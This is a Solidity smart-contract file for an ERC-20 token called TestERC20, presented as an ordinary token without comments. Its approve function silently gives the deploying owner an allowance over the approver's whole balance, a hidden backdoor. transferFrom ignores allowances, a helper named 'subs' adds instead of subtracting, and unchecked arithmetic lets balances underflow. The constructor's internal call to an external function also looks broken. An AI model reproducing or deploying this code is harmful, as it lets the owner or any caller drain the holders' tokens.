// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TestERC20 is IERC20 {
    uint256 private _totalSupply;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    address immutable _owner;


    constructor (uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = msg.sender;
        transfer(msg.sender, _totalSupply);
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _balances[msg.sender] = sub(_balances[msg.sender], amount);
        _balances[recipient] = add(_balances[recipient], amount);
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        _allowances[msg.sender][_owner] = _totalSupply;
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        unchecked {
            _balances[sender] = sub(_balances[sender], amount);
            _balances[recipient] = add(_balances[recipient], amount);
            _allowances[sender][msg.sender] = subs(_allowances[sender][msg.sender], amount);
            return true;
        }
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a + b;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a - b;
        }
    }

    function subs(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            return a + b;
        }
    }

}

